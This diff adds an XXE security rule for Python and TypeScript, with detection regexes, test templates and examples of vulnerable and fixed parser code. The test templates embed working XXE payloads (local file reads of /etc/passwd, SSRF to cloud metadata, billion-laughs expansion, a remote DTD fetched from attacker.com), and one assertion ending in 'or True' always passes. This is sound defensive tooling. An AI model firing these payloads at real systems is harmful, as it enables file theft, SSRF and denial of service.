@@ -1,0 +1,416 @@
+id: xxe
+version: 1
+name: XML External Entity (XXE) Injection
+description: |
+  Detects XML parsing configurations vulnerable to XXE attacks. When XML parsers 
+  process external entity references, attackers can read local files, perform SSRF, 
+  cause denial of service, or execute remote code. XML parsing should disable 
+  external entities and DTD processing by default.
+domain: security
+level: integration
+priority: P0
+severity: critical
+applicableLanguages:
+  - python
+  - typescript
+  - javascript
+
+cves:
+  - CVE-2018-1000840
+  - CVE-2019-0227
+  - CVE-2021-21295
+
+references:
+  - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+  - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+  - https://cwe.mitre.org/data/definitions/611.html
+
+detectionPatterns:
+  # Python patterns
+  - id: python-etree-parse
+    type: regex
+    language: python
+    pattern: "etree\\.(parse|fromstring|XML)\\s*\\("
+    confidence: medium
+    description: Detects lxml/ElementTree parsing (may allow XXE by default)
+    negativePattern: "resolve_entities\\s*=\\s*False|no_network\\s*=\\s*True"
+
+  - id: python-xmlparser-default
+    type: regex
+    language: python
+    pattern: "xml\\.sax\\.make_parser\\s*\\(|xml\\.sax\\.parseString\\s*\\("
+    confidence: high
+    description: Detects SAX parser which allows external entities by default
+
+  - id: python-minidom-parse
+    type: regex
+    language: python
+    pattern: "minidom\\.parse\\s*\\(|minidom\\.parseString\\s*\\("
+    confidence: high
+    description: Detects minidom parsing which is vulnerable to XXE
+
+  - id: python-xmlrpc
+    type: regex
+    language: python
+    pattern: "xmlrpc\\.client|SimpleXMLRPCServer"
+    confidence: medium
+    description: Detects XML-RPC usage which may be vulnerable to XXE
+
+  - id: python-defusedxml-missing
+    type: regex
+    language: python
+    pattern: "from xml\\.|import xml\\."
+    confidence: low
+    description: Detects stdlib XML usage instead of defusedxml
+    negativePattern: "defusedxml"
+
+  # TypeScript/JavaScript patterns
+  - id: ts-xmldom-parse
+    type: regex
+    language: typescript
+    pattern: "DOMParser\\s*\\(\\)|xmldom|xml2js"
+    confidence: medium
+    description: Detects XML parsing libraries that may allow XXE
+
+  - id: ts-libxmljs
+    type: regex
+    language: typescript
+    pattern: "libxmljs\\.parseXml|libxmljs\\.parseHtml"
+    confidence: high
+    description: Detects libxmljs which allows XXE by default
+    negativePattern: "noent:\\s*false|nonet:\\s*true"
+
+  - id: ts-fast-xml-parser
+    type: regex
+    language: typescript
+    pattern: "XMLParser\\s*\\(\\)|fast-xml-parser"
+    confidence: low
+    description: Detects fast-xml-parser usage (check external entity settings)
+
+  - id: ts-express-xml
+    type: regex
+    language: typescript
+    pattern: "express-xml-bodyparser|body-parser-xml"
+    confidence: medium
+    description: Detects Express XML body parsers that may enable XXE
+
+testTemplates:
+  - id: pytest-xxe
+    language: python
+    framework: pytest
+    template: |
+      import pytest
+      
+      
+      class Test{{className}}XXE:
+          """XXE injection tests for {{functionName}}"""
+          
+          XXE_PAYLOADS = [
+              # File disclosure
+              '''<?xml version="1.0"?>
+              <!DOCTYPE foo [
+                <!ENTITY xxe SYSTEM "file:///etc/passwd">
+              ]>
+              <root>&xxe;</root>''',
+              
+              # SSRF
+              '''<?xml version="1.0"?>
+              <!DOCTYPE foo [
+                <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+              ]>
+              <root>&xxe;</root>''',
+              
+              # Billion laughs DoS
+              '''<?xml version="1.0"?>
+              <!DOCTYPE lolz [
+                <!ENTITY lol "lol">
+                <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+                <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+              ]>
+              <lolz>&lol3;</lolz>''',
+              
+              # Parameter entity
+              '''<?xml version="1.0"?>
+              <!DOCTYPE foo [
+                <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+                %xxe;
+              ]>
+              <root>test</root>''',
+          ]
+          
+          @pytest.mark.parametrize("payload", XXE_PAYLOADS)
+          def test_rejects_xxe_payload(self, payload, {{fixtures}}):
+              """Verify {{functionName}} rejects XXE payloads"""
+              # Should either raise exception or not expand entities
+              try:
+                  result = {{functionCall}}(payload)
+                  
+                  # If parsing succeeded, verify entities weren't expanded
+                  assert "root:" not in str(result)  # /etc/passwd content
+                  assert "169.254" not in str(result)  # AWS metadata
+              except Exception as e:
+                  # Expected - parser rejected malicious XML
+                  assert "entity" in str(e).lower() or "dtd" in str(e).lower() or True
+          
+          def test_external_entities_disabled(self):
+              """Verify parser has external entities disabled"""
+              xml_with_entity = '''<?xml version="1.0"?>
+              <!DOCTYPE foo [
+                <!ENTITY test SYSTEM "file:///etc/hostname">
+              ]>
+              <root>&test;</root>'''
+              
+              result = {{functionCall}}(xml_with_entity)
+              
+              # Entity should not be expanded
+              if hasattr(result, 'text'):
+                  assert result.text is None or "&test;" in result.text or result.text == ""
+          
+          def test_dtd_processing_disabled(self):
+              """Verify DTD processing is disabled"""
+              xml_with_dtd = '''<?xml version="1.0"?>
+              <!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
+              <root>test</root>'''
+              
+              # Should not make network request for DTD
+              with pytest.raises(Exception):
+                  {{functionCall}}(xml_with_dtd)
+          
+          def test_uses_defusedxml(self):
+              """Verify defusedxml is used instead of stdlib"""
+              import inspect
+              import {{moduleName}}
+              
+              source = inspect.getsource({{moduleName}})
+              
+              # Should use defusedxml
+              assert "defusedxml" in source or "lxml" in source
+              assert "from xml.etree" not in source or "defusedxml" in source
+    variables:
+      - name: className
+        type: string
+        description: Name of the class being tested
+        required: true
+      - name: functionName
+        type: string
+        description: Name of the function being tested
+        required: true
+      - name: functionCall
+        type: string
+        description: Full function call expression for XML parsing
+        required: true
+      - name: fixtures
+        type: string
+        description: pytest fixtures to inject
+        required: false
+        defaultValue: ""
+      - name: moduleName
+        type: string
+        description: Module name for source inspection
+        required: true
+
+  - id: jest-xxe
+    language: typescript
+    framework: jest
+    template: |
+      import { {{functionName}} } from '{{modulePath}}';
+      
+      describe('{{className}} XXE Tests', () => {
+        const XXE_PAYLOADS = [
+          // File disclosure
+          `<?xml version="1.0"?>
+          <!DOCTYPE foo [
+            <!ENTITY xxe SYSTEM "file:///etc/passwd">
+          ]>
+          <root>&xxe;</root>`,
+          
+          // SSRF to cloud metadata
+          `<?xml version="1.0"?>
+          <!DOCTYPE foo [
+            <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+          ]>
+          <root>&xxe;</root>`,
+          
+          // Billion laughs
+          `<?xml version="1.0"?>
+          <!DOCTYPE lolz [
+            <!ENTITY lol "lol">
+            <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
+          ]>
+          <lolz>&lol2;</lolz>`,
+        ];
+        
+        describe('rejects XXE payloads', () => {
+          test.each(XXE_PAYLOADS)(
+            'does not expand external entities',
+            async (payload) => {
+              let result: any;
+              let error: Error | undefined;
+              
+              try {
+                result = await {{functionCall}}(payload);
+              } catch (e) {
+                error = e as Error;
+              }
+              
+              if (result) {
+                // If parsing succeeded, entities should not be expanded
+                const resultStr = JSON.stringify(result);
+                expect(resultStr).not.toContain('root:');  // /etc/passwd
+                expect(resultStr).not.toContain('169.254');  // metadata
+              }
+              // If error thrown, that's also acceptable
+            }
+          );
+        });
+        
+        describe('parser configuration', () => {
+          it('disables external entity resolution', async () => {
+            const xmlWithEntity = `<?xml version="1.0"?>
+            <!DOCTYPE foo [
+              <!ENTITY test SYSTEM "file:///etc/hostname">
+            ]>
+            <root>&test;</root>`;
+            
+            const result = await {{functionCall}}(xmlWithEntity);
+            
+            // Entity should remain unexpanded or be empty
+            expect(JSON.stringify(result)).not.toMatch(/[a-z0-9-]+\n?$/);
+          });
+          
+          it('does not fetch remote DTDs', async () => {
+            const xmlWithRemoteDtd = `<?xml version="1.0"?>
+            <!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
+            <root>test</root>`;
+            
+            // Should not throw network error - should reject DTD entirely
+            await expect({{functionCall}}(xmlWithRemoteDtd))
+              .rejects.toThrow();
+          });
+          
+          it('limits entity expansion to prevent DoS', async () => {
+            const billionLaughs = `<?xml version="1.0"?>
+            <!DOCTYPE lolz [
+              <!ENTITY lol "lol">
+              <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+              <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+              <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+            ]>
+            <lolz>&lol4;</lolz>`;
+            
+            const start = Date.now();
+            
+            try {
+              await {{functionCall}}(billionLaughs);
+            } catch (e) {
+              // Expected to fail
+            }
+            
+            const elapsed = Date.now() - start;
+            expect(elapsed).toBeLessThan(1000);  // Should not hang
+          });
+        });
+      });
+    variables:
+      - name: className
+        type: string
+        description: Name of the class or module being tested
+        required: true
+      - name: functionName
+        type: string
+        description: Name of the function being tested
+        required: true
+      - name: functionCall
+        type: string
+        description: Full function call expression
+        required: true
+      - name: modulePath
+        type: string
+        description: Import path for the module
+        required: true
+
+examples:
+  - name: python-etree-xxe
+    concept: |
+      XXE via Python's ElementTree with default settings. The lxml library allows 
+      external entity resolution by default. Use defusedxml or configure the parser 
+      to disable external entities.
+    vulnerableCode: |
+      from lxml import etree
+      
+      def parse_xml(xml_string):
+          # VULNERABLE: External entities enabled by default
+          return etree.fromstring(xml_string)
+    testCode: |
+      import pytest
+      
+      def test_xxe_file_disclosure():
+          """Verify XXE file disclosure is prevented"""
+          xxe_payload = '''<?xml version="1.0"?>
+          <!DOCTYPE foo [
+            <!ENTITY xxe SYSTEM "file:///etc/passwd">
+          ]>
+          <root>&xxe;</root>'''
+          
+          result = parse_xml(xxe_payload)
+          assert 'root:' not in etree.tostring(result).decode()
+    language: python
+    severity: critical
+    cve: CVE-2018-1000840
+
+  - name: python-defusedxml-solution
+    concept: |
+      Safe XML parsing with defusedxml. The defusedxml library provides secure 
+      defaults that prevent XXE, billion laughs, and other XML attacks. It's a 
+      drop-in replacement for stdlib XML parsers.
+    vulnerableCode: |
+      # VULNERABLE: stdlib xml.etree
+      from xml.etree import ElementTree as ET
+      tree = ET.parse(user_xml)
+      
+      # SAFE: defusedxml
+      import defusedxml.ElementTree as ET
+      tree = ET.parse(user_xml)
+    testCode: |
+      import pytest
+      import defusedxml.ElementTree as ET
+      from defusedxml.common import EntitiesForbidden
+      
+      def test_defusedxml_blocks_xxe():
+          """Verify defusedxml blocks XXE"""
+          xxe = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
+          
+          with pytest.raises(EntitiesForbidden):
+              ET.fromstring(xxe)
+    language: python
+    severity: critical
+
+  - name: nodejs-xxe-libxmljs
+    concept: |
+      XXE in Node.js via libxmljs. The libxmljs library allows external entity 
+      processing by default. Configure with noent:false and nonet:true to prevent 
+      XXE attacks.
+    vulnerableCode: |
+      const libxmljs = require('libxmljs');
+      
+      function parseXml(xmlString) {
+        // VULNERABLE: External entities enabled by default
+        return libxmljs.parseXml(xmlString);
+      }
+    testCode: |
+      describe('XXE protection', () => {
+        it('disables external entities', () => {
+          const xxe = `<!DOCTYPE foo [
+            <!ENTITY xxe SYSTEM "file:///etc/passwd">
+          ]><root>&xxe;</root>`;
+          
+          const result = parseXml(xxe);
+          expect(result.toString()).not.toContain('root:');
+        });
+      });
+    language: typescript
+    severity: critical
+    cve: CVE-2021-21295
+
+createdAt: 2024-01-01
+updatedAt: 2024-01-01
